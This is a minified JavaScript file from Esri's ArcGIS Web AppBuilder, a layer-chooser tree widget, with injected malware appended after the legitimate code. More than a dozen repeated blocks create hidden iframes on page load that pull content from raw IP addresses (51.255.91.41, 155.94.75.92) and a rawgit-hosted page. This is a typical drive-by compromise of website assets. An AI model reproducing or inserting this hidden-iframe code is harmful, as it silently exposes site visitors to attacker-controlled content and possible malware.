// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/on dojo/Evented dojo/_base/declare dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/store/Memory dojo/Deferred dojo/store/Observable dijit/tree/ObjectStoreModel dojo/promise/all dojo/_base/lang dojo/_base/html dojo/_base/array jimu/utils jimu/dijit/_Tree jimu/LayerInfos/LayerInfos jimu/dijit/LoadingIndicator".split(" "),function(r,t,u,v,w,x,y,n,z,A,k,d,p,h,m,B,C,D){var g=u([v,w,x,t],{templateString:'\x3cdiv style\x3d"width:100%;"\x3e\x3cdiv data-dojo-attach-point\x3d"errorTipSection" class\x3d"error-tip-section"\x3e\x3cspan class\x3d"jimu-icon jimu-icon-error"\x3e\x3c/span\x3e\x3cspan class\x3d"jimu-state-error-text" data-dojo-attach-point\x3d"errTip"\x3e${nls.noLayersTip}\x3c/span\x3e\x3c/div\x3e\x3c/div\x3e',
_store:null,_id:0,_treeClass:"layer-chooser-tree",createMapResponse:null,multiple:!1,onlyShowVisible:!1,updateWhenLayerInfosIsShowInMapChanged:!1,onlyShowWebMapLayers:!1,displayTooltipForTreeNode:!1,postMixInProperties:function(){this.nls=window.jimuNls.basicLayerChooserFromMap},postCreate:function(){this.inherited(arguments);p.addClass(this.domNode,"jimu-basic-layer-chooser-from-map");this.multiple=!!this.multiple;this.shelter=new D({hidden:!0});this.shelter.placeAt(this.domNode);this.shelter.startup();
this._createTree();this.basicFilter=d.hitch(this,this.basicFilter);this.filter=g.andCombineFilters([this.basicFilter,this.filter]);this.createMapResponse&&this.setCreateMapResponse(this.createMapResponse)},basicFilter:function(a){var b=new n;this.onlyShowVisible?b.resolve(a.isShowInMap()):b.resolve(!0);return b},filter:function(a){a=new n;a.resolve(!0);return a},getSelectedItems:function(){var a=this.tree.getSelectedItems();return h.map(a,d.hitch(this,function(a){return this.getHandledItem(a)}))},
getAllItems:function(){var a=this.tree.getAllItems(),b=[];h.forEach(a,d.hitch(this,function(a){"root"!==a.id&&(a=this.getHandledItem(a),b.push(a))}));return b},getHandledItem:function(a){return{name:a.name,layerInfo:a.layerInfo}},_isLeafItem:function(a){return a.isLeaf},setCreateMapResponse:function(a){this.createMapResponse=a;C.getInstance(this.createMapResponse.map,this.createMapResponse.itemInfo).then(d.hitch(this,function(a){this.layerInfosObj=a;this.own(r(this.layerInfosObj,"layerInfosChanged",
d.hitch(this,this._onLayerInfosChanged)));this.updateWhenLayerInfosIsShowInMapChanged&&this.own(r(this.layerInfosObj,"layerInfosIsShowInMapChanged",d.hitch(this,this._onLayerInfosIsShowInMapChanged)));this._buildTree(this.layerInfosObj)}))},_onLayerInfosChanged:function(a,b){this._buildTree(this.layerInfosObj);this.emit("update")},_onLayerInfosIsShowInMapChanged:function(a){this._buildTree(this.layerInfosObj);this.emit("update")},_buildTree:function(a){this._clear();p.setStyle(this.errorTipSection,
"display","block");var b=[];this.onlyShowWebMapLayers?(b=a.getLayerInfoArrayOfWebmap(),b=b.concat(a.getTableInfoArrayOfWebmap())):(b=a.getLayerInfoArray(),b=b.concat(a.getTableInfoArray()));0!==b.length&&(p.setStyle(this.errorTipSection,"display","none"),h.forEach(b,d.hitch(this,function(a){this._addDirectLayerInfo(a)})))},_addDirectLayerInfo:function(a){a&&a.getLayerObject().then(d.hitch(this,function(){this._addItem("root",a)}),d.hitch(this,function(a){console.error(a)}))},_clear:function(){var a=
this._store.query({parent:"root"});h.forEach(a,d.hitch(this,function(a){a&&"root"!==a.id&&this._store.remove(a.id)}))},_addItem:function(a,b){var e=null,f=b.getLayerType(),c=this.filter(b);k({layerType:f,valid:c}).then(d.hitch(this,function(l){if(l.valid){var f=d.hitch(this,function(f,c){this._id++;e={name:b.title||"",parent:a,layerInfo:b,type:l.layerType,layerClass:b.layerObject.declaredClass,id:this._id.toString(),isLeaf:f,hasChildren:c};this._store.add(e)}),q=b.getSubLayers(),c=0===q.length;c?
f(c,!1):(q=h.map(q,d.hitch(this,function(a){return this.filter(a)})),k(q).then(d.hitch(this,function(a){(a=h.some(a,function(a){return a}))&&f(c,a)})))}}))},_getRootItem:function(){return{id:"root",name:"Map Root",type:"root",isLeaf:!1,hasChildren:!0}},_createTree:function(){var a=this._getRootItem(),a=new y({data:[a],getChildren:function(a){return this.query({parent:a.id})}});this._store=new z(a);a=new A({store:this._store,query:{id:"root"},mayHaveChildren:d.hitch(this,this._mayHaveChildren)});this.tree=
new B({multiple:this.multiple,model:a,showRoot:!1,isLeafItem:d.hitch(this,this._isLeafItem),style:{width:"100%"},onOpen:d.hitch(this,function(a,e){"root"!==a.id&&this._onTreeOpen(a,e)}),onClick:d.hitch(this,function(a,e,f){this._onTreeClick(a,e,f);this.emit("tree-click",a,e,f)}),getIconStyle:d.hitch(this,function(a,e){var b=null;if(!a||"root"===a.id)return null;var c={width:"20px",height:"20px",backgroundRepeat:"no-repeat",backgroundPosition:"center center",backgroundImage:""},l=window.location.protocol+
"//"+window.location.host+require.toUrl("jimu");if(a=this._getIconImageName(a,e))c.backgroundImage="url("+l+"/css/images/"+a+")",b=c;return b}),getTooltip:d.hitch(this,function(a){return this.displayTooltipForTreeNode?a.layerInfo.title:""})});p.addClass(this.tree.domNode,this._treeClass);this.tree.placeAt(this.shelter.domNode,"before")},_mayHaveChildren:function(a){return a.hasChildren},_getIconImageName:function(a,b){var e="";"ArcGISDynamicMapServiceLayer"===a.type||"ArcGISTiledMapServiceLayer"===
a.type?e=b?"mapserver_open.png":"mapserver_close.png":"GroupLayer"===a.type?e=b?"group_layer2.png":"group_layer1.png":"FeatureLayer"===a.type?(a=m.getTypeByGeometryType(a.layerInfo.layerObject.geometryType),"point"===a?e="point_layer1.png":"polyline"===a?e="line_layer1.png":"polygon"===a&&(e="polygon_layer1.png")):e="Table"===a.type?"table.png":"ArcGISImageServiceLayer"===a.type||"ArcGISImageServiceVectorLayer"===a.type?"image_layer.png":b?"mapserver_open.png":"mapserver_close.png";return e},_onTreeOpen:function(a,
b){if("root"!==a.id){var e=[];b=[];e=a.layerInfo.getSubLayers();a.checked||(this.shelter.show(),b=h.map(e,d.hitch(this,function(a){return a.getLayerObject()})),k(b).then(d.hitch(this,function(){this.domNode&&(h.forEach(e,d.hitch(this,function(b){this._addItem(a.id,b)})),a.checked=!0,this.shelter.hide())}),d.hitch(this,function(a){console.error(a);this.shelter.hide()})))}},_onTreeClick:function(a,b,e){},destroy:function(){this.shelter&&(this.shelter.destroy(),this.shelter=null);this.tree&&this.tree.destroy();
this.inherited(arguments)}});g.createFilterByLayerType=function(a){d.isArrayLike(a)||(a=[]);return function(b){var e=new n;if(0===a.length)e.resolve(!0);else{var d=[];b.traversal(function(a){d.push(a.getLayerType())});k(d).then(function(b){for(var d=0;d<b.length;d++)for(var c=0;c<a.length;c++)if(b[d]===a[c]){e.resolve(!0);return}e.resolve(!1)},function(a){console.error(a);e.reject(a)})}return e}};g.createFeaturelayerFilter=function(a,b,e,d){var c=["point","polyline","polygon"];a&&0<a.length?(a=h.filter(a,
function(a){return 0<=c.indexOf(a)}),0===a.length&&(a=c)):a=c;return function(c){var f=c.getLayerType();c=c.getLayerObject();return k({layerType:f,layerObject:c}).then(function(c){var f=c.layerType;c=c.layerObject;if("ArcGISDynamicMapServiceLayer"===f||"ArcGISTiledMapServiceLayer"===f||"GroupLayer"===f||"FeatureCollection"===f)return!0;if("FeatureLayer"===f){var f=m.getTypeByGeometryType(c.geometryType),f=0<=h.indexOf(a,f),l=g._shouldPassStatisticsCheck(d,c);return c.url?(c=m.isFeaturelayerUrlSupportQuery(c.url,
c.capabilities),f&&c&&l):b&&f}return"Table"===f?(f=m.isFeaturelayerUrlSupportQuery(c.url,c.capabilities),c=g._shouldPassStatisticsCheck(d,c),e&&f&&c):!1})}};g.createImageServiceLayerFilter=function(a,b){return function(e){var d=e.getLayerType();e=e.getLayerObject();return k({layerType:d,layerObject:e}).then(function(c){var d=c.layerType,e=c.layerObject;return"ArcGISImageServiceLayer"===d||"ArcGISImageServiceVectorLayer"===d?a?m.isImageServiceSupportQuery(c.layerObject.capabilities)?b?g._shouldPassStatisticsCheck(b,
e):!0:!1:!0:!1})}};g._shouldPassStatisticsCheck=function(a,b){return a?(a=!1,a=b.advancedQueryCapabilities?!!b.advancedQueryCapabilities.supportsStatistics:!!b.supportsStatistics):!0};g.createQueryableLayerFilter=function(a){var b=g.createFeaturelayerFilter(["point","polyline","polygon"],!1,!0,a);a=g.createImageServiceLayerFilter(!0,a);return g.orCombineFilters([b,a])};g.andCombineFilters=function(a){return g._combineFilters(a,!0)};g.orCombineFilters=function(a){return g._combineFilters(a,!1)};g._combineFilters=
function(a,b){return function(d){var e=new n,c=h.map(a,function(a){return a(d)});k(c).then(function(a){var c=!1,c=b?h.every(a,function(a){return a}):h.some(a,function(a){return a});e.resolve(c)},function(a){console.error(a);e.reject(a)});return e}};return g});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});